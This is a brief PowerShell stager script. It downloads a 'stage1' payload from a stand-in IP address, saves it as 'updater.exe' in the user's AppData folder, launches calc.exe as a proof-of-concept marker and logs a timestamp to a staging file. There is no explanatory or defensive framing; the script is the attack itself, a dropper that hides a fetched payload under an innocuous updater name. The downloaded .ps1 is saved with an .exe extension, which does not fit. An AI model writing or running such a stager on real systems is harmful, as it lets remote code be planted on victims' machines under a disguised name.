[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://203.0.113.240/stage1.ps1',
    [string]$Stage2Path = "$env:APPDATA\updater.exe",
    [int]$StageTimeout = 50
)
try { Invoke-WebRequest -Uri $PayloadUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe"; Set-Location -Path $env:TEMP; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Remote fetch failed" }
